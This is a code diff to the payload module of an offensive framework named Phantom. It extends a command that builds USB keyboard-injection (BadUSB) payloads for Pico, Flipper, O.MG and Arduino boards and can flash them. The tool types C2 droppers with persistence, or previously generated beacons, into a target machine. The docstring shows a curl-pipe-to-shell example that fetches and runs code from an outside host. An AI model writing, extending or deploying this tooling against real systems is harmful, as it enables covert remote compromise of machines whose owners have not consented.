@@ -88,6 +88,24 @@ def _os_to_payload_hint(os_string: str) -> tuple:
     return answer.arch, answer.platform
 
 
+def _confirm_typing() -> bool:
+    """Ask before writing a payload whose command looks like the wrong OS.
+
+    Non-interactive callers (a script, an automated run, a test) get the
+    answer they cannot be asked for: proceed, with the warning already
+    printed. Refusing there would be a silent block, which the command
+    promises NOT to do --- `--strict` is the explicit refusal.
+    """
+    import sys
+    if not sys.stdin.isatty():
+        return True
+    try:
+        answer = input("  Write the artefact anyway? [y/N]: ")
+    except (EOFError, KeyboardInterrupt):
+        return False
+    return answer.strip().lower() in ("y", "yes")
+
+
 class PayloadModule(BaseModule):
     module_name = "payload"
 
@@ -96,8 +114,9 @@ class PayloadModule(BaseModule):
             {
                 "CORE": ["generate", "reverse [lhost] [lport]",
                           "bind [port]", "deploy", "privesc"],
-                "DELIVERY": ["hid <board> \"<command>\" [--target <os>] "
-                             "[--stager <os>] [--out <file>]"],
+                "DELIVERY": ["hid <board> [\"<command>\" | --from-payload <id> | "
+                             "--stager <os>] [--type-into <os>] "
+                             "[--out <file>]"],
                 "LISTENER": ["handler <port> <payload>"],
             },
             self.suggest_commands(),
@@ -232,17 +251,37 @@ class PayloadModule(BaseModule):
             console.print("  - Check sudo permissions (`sudo -l`)")
 
     def do_hid(self, arg):
-        """hid <board> ["<command>" | --stager <os>] [flags]
+        """hid <board> ["<command>" | --from-payload <id> | --stager <os>] [flags]
 
         Build a USB HID payload for a keyboard-injector board: AutoRun on
         removable volumes is dead at the OS level, so the vector that works
         is a board that TYPES the payload (RP2040/Pico with CircuitPython,
         Flipper Zero BadUSB, O.MG cable, Arduino-IDE `Keyboard.h` boards).
 
+        TWO THINGS ARE CALLED "target" IN PHANTOM AND ONLY ONE IS A FLAG
+        HERE: `--type-into <os>` is the OS the board will TYPE INTO (it picks
+        the opener and it is the OS the typed command must match), while the
+        engagement target is `targets add <host>` / `set target <ip>` — the
+        board has no idea which host the command lands on. `--target` still
+        works as a DEPRECATED alias of `--type-into`, and warns.
+
+        Command source — exactly one:
+          "<command>"       the literal command the board types.
+          --from-payload <id>
+                            type the command `generate` already built and
+                            registered (see `payloads`). The id may be a
+                            unique prefix; an unknown or ambiguous id is
+                            refused and the inventory is listed, and the
+                            payload's platform must match --type-into.
+          --stager <os>     build the PHANTOM stager for that OS with the
+                            current C2 endpoint and type THAT.
+
         Flags:
-          --target <os>   the OS the board will type into (windows|linux|
+          --type-into <os>  the OS the board will type into (windows|linux|
                           macos|android): the command must match it, and
                           nothing can detect it at runtime (9.2)
+          --target <os>   deprecated alias of --type-into (it is NOT the
+                          engagement target: that one is `targets add`)
           --layout <l>    the keyboard layout the TARGET has active
                           (us|it, default us). The board sends US scan
                           codes, so on an Italian target / ( = {} @ # come
@@ -256,6 +295,8 @@ class PayloadModule(BaseModule):
                           scheduled task / POSIX cron) so the beacon still
                           lands once the C2 comes up — the operator types
                           it once and walks away.
+          --strict        refuse (instead of asking) when the command does
+                          not match --type-into
           --out <file>    where to write the artefact (default:
                           data/vectors/)
           --delay <ms>    wait before typing (default 1500: the host has to
@@ -268,25 +309,32 @@ class PayloadModule(BaseModule):
                           with arduino-cli (compile then upload), e.g.
                           --flash COM5. The sketch folder is created with
                           the name the Arduino toolchain requires.
-          --fqbn <fqbn>   board id for --flash (default arduino:avr:micro)
+          --fqbn <fqbn>   board id for --flash (default arduino:avr:micro;
+                          leonardo is arduino:avr:leonardo)
           --arduino-cli <path>  arduino-cli binary for --flash (default:
                           PATH, else $PHANTOM_ARDUINO_CLI)
 
         Examples:
-          payload hid pico --stager windows --target windows --run
-          payload hid flipper "curl -sk http://10.0.0.5:8443/x | sh" \
-              --target linux
-          payload hid omg --stager linux --target linux
-          payload hid arduino --stager windows --target windows --run \
+          payload hid pico --stager windows --type-into windows --run
+          payload hid flipper "curl -sk http://10.0.0.5:8443/x | sh" \\
+              --type-into linux
+          payload hid omg --stager linux --type-into linux
+          payload hid arduino --from-payload 3f2a91c4 --type-into windows
+          payload hid arduino --stager windows --type-into windows --run \\
               --layout it
+          payload hid leonardo --from-payload 3f2a91c4 --type-into windows \\
+              --flash COM5 --fqbn arduino:avr:leonardo
         """
         from phantom.utils.hid_builder import (
-            ARDUINO_BOARDS, BOARDS, board_notes, build_hid_payload)
+            ALL_BOARD_NAMES, ARDUINO_BOARDS, board_notes, build_hid_payload,
+            canonical_board, mismatch_hints)
 
         parts = arg.strip().split()
         board = ""
+        board_arg = ""
         command = ""
         target = ""
+        from_payload = ""
         stager = ""
         layout = "us"
         out = ""
@@ -296,12 +344,26 @@ class PayloadModule(BaseModule):
         flash = ""
         fqbn = ""
         arduino_cli = ""
+        strict = False
+        deprecated_target = False
 
         i = 0
         while i < len(parts):
             tok = parts[i]
-            if tok == "--target" and i + 1 < len(parts):
-                target = parts[i + 1].lower()
+            if tok in ("--type-into", "--target") and i + 1 < len(parts):
+                value = parts[i + 1].lower()
+                if tok == "--target":
+                    deprecated_target = True
+                if target and target != value:
+                    notifier.error(
+                        f"--type-into {target} and --target {value} disagree: "
+                        f"the board types into ONE os.")
+                    return
+                target = value
+                i += 2
+                continue
+            if tok == "--from-payload" and i + 1 < len(parts):
+                from_payload = parts[i + 1]
                 i += 2
                 continue
             if tok == "--stager" and i + 1 < len(parts):
@@ -344,8 +406,16 @@ class PayloadModule(BaseModule):
                 open_run = True
                 i += 1
                 continue
-            if not board and tok.lower() in BOARDS:
-                board = tok.lower()
+            if tok == "--strict":
+                strict = True
+                i += 1
+                continue
+            if not board and tok.lower() in ALL_BOARD_NAMES:
+                # the board the operator PLUGGED IN (leonardo, pro-micro) and
+                # the FAMILY that decides the generator are two things: the
+                # variant is kept for the artefact name and the FQBN.
+                board_arg = tok.lower()
+                board = canonical_board(board_arg)
                 i += 1
                 continue
             # anything left is the command to type (quotes already stripped
@@ -354,17 +424,74 @@ class PayloadModule(BaseModule):
             i += 1
 
         if not board:
-            notifier.error(f"hid wants a board: {', '.join(BOARDS)}")
+            notifier.error(
+                f"hid wants a board: {', '.join(ALL_BOARD_NAMES)}")
             return
+        if deprecated_target:
+            # One word, two meanings in the same CLI: `target` everywhere
+            # else in Phantom is the engagement HOST. Saying which one this
+            # is, once, is the whole fix — and --target keeps working.
+            notifier.warn(
+                "--target here is only the OS the board TYPES INTO; the "
+                "engagement target is `targets add` / `set target`. Use "
+                "--type-into <os> (--target stays as a deprecated alias).")
         if flash and board not in ARDUINO_BOARDS:
             notifier.error("--flash uploads through arduino-cli, which only "
                            "serves the 'arduino' board")
             return
+        if from_payload and stager:
+            notifier.error("--from-payload uses the command that already "
+                           "exists and --stager builds a new one: pick one.")
+            return
+        if from_payload and command:
+            notifier.error(
+                "--from-payload plus an inline command is two sources for one "
+                "artefact: drop one (a silent precedence is how the wrong "
+                "command gets typed).")
+            return
+        payload_platform = ""
+        if from_payload:
+            from phantom.utils.payload_manager import get_custom_beacons
+            history = get_custom_beacons()
+            if not history:
+                notifier.error("no generated payload in the inventory: run "
+                               "`generate <os>` first (or type the command "
+                               "inline).")
+                return
+            matches = [e for e in history
+                       if str(e.get("id", "")).startswith(from_payload)]
+            if not matches:
+                notifier.error(f"no payload with id '{from_payload}'.")
+                notifier.info("available payloads (full command with "
+                              "`payloads <id>`):")
+                for entry in history:
+                    notifier.info(f"  {str(entry.get('id', ''))[:8]}..  "
+                                  f"{str(entry.get('platform', '?')):8} "
+                                  f"{entry.get('description', '')}")
+                return
+            if len(matches) > 1:
+                notifier.error(f"ambiguous id '{from_payload}' — "
+                               f"{len(matches)} payloads start with it:")
+                for entry in matches:
+                    notifier.info(f"  {entry.get('id')}  "
+                                  f"{entry.get('platform', '?')}  "
+                                  f"{entry.get('description', '')}")
+                return
+            entry = matches[0]
+            payload_platform = str(entry.get("platform") or "").lower()
+            command = str(entry.get("command") or "").strip()
+            if not command:
+                notifier.error(f"payload {from_payload} carries no command to "
+                               "type (regenerate it with `generate`).")
+                return
+            notifier.info(f"payload {str(entry.get('id', ''))[:8]}.. "
+                          f"({payload_platform or 'unknown'}): "
+                          f"{entry.get('description', '')}")
         if stager:
             if target and target != stager:
                 notifier.error(
-                    f"--stager {stager} but --target {target}: the board "
-                    f"types one artefact and PE ≠ ELF ≠ Mach-O — pick one.")
+                    f"--stager {stager} but the board types into {target}: "
+                    f"one artefact, and PE ≠ ELF ≠ Mach-O — pick one.")
                 return
             from phantom.utils.builder import generate_dropper
             from phantom.utils import config as cfg
@@ -373,11 +500,46 @@ class PayloadModule(BaseModule):
             command = generate_dropper(stager, host, port, use_ssl=True,
                                        resilient=True)
             target = target or stager
+            payload_platform = payload_platform or stager
             notifier.info(f"stager for {stager} built with the current C2 "
                           f"endpoint ({host}:{port})")
         if not command:
-            notifier.error("hid wants the command to type (or --stager <os>)")
+            notifier.error("hid wants the command to type (or --from-payload "
+                           "<id>, or --stager <os>)")
             return
+
+        # 9.2 — the artefact is for ONE os and the inventory knows which:
+        # comparing them here is what turns "the board typed a PowerShell
+        # one-liner into a Linux box" from a discovery made with the board in
+        # hand into a refusal made at the keyboard.
+        if payload_platform and payload_platform != "unknown" and target \
+                and payload_platform != target:
+            notifier.error(
+                f"the payload is built for {payload_platform} but the board "
+                f"would type it into {target}: PE ≠ ELF ≠ Mach-O — regenerate "
+                f"it for {target} (`generate {target}`) or point --type-into "
+                f"at {payload_platform}.")
+            return
+        if payload_platform and payload_platform != "unknown" and not target:
+            notifier.warn(
+                f"payload built for {payload_platform} and no --type-into "
+                f"given: pass `--type-into {payload_platform}` so the opener "
+                f"and the command warnings describe the box it lands on.")
+
+        # A command on the wrong side of the fence is almost always a typo,
+        # but a valid shell command can CONTAIN those words: suggest, then
+        # ask. --strict is the operator's explicit refusal, not the default.
+        hints = mismatch_hints(command, target)
+        if hints:
+            for hint in hints:
+                notifier.warn(hint)
+            if strict:
+                notifier.error(f"--strict: refusing to write a mismatched "
+                               f"payload. {hints[0]}")
+                return
+            if not _confirm_typing():
+                notifier.warn("cancelled: nothing written.")
+                return
         try:
             payload = build_hid_payload(board, command, target=target,
                                         layout=layout,
@@ -391,7 +553,7 @@ class PayloadModule(BaseModule):
         import os
         if not out:
             from phantom.utils.paths import data_dir
-            name = f"{board}_{payload.filename}"
+            name = f"{board_arg}_{payload.filename}"
             if board in ARDUINO_BOARDS:
                 # the Arduino IDE refuses a sketch whose folder is not named
                 # after the .ino file: put it in a folder of the same name
@@ -407,11 +569,13 @@ class PayloadModule(BaseModule):
         for note in board_notes(board):
             notifier.info(note)
         if flash:
-            from phantom.utils.arduino_flash import DEFAULT_FQBN, flash_sketch
+            from phantom.utils.arduino_flash import (
+                DEFAULT_FQBN, flash_sketch, fqbn_for)
             notifier.status(f"Flashing {os.path.basename(out)} to {flash} "
                             f"with arduino-cli...")
             result = flash_sketch(os.path.dirname(os.path.abspath(out)), flash,
-                                  fqbn=(fqbn or DEFAULT_FQBN),
+                                  fqbn=(fqbn or fqbn_for(board_arg)
+                                        or DEFAULT_FQBN),
                                   cli=(arduino_cli or None))
             for step in result.steps:
                 notifier.info(f"  {step.summary()}")
@@ -421,7 +585,7 @@ class PayloadModule(BaseModule):
                 notifier.success(result.summary())
             else:
                 notifier.error(result.summary())
-        session.add_note(f"HID payload ({board}) -> {out}")
+        session.add_note(f"HID payload ({board_arg or board}) -> {out}")
 
     def _get_lhost(self) -> str:
         """Auto-detect local IP (VPN/tun0 or default route)."""
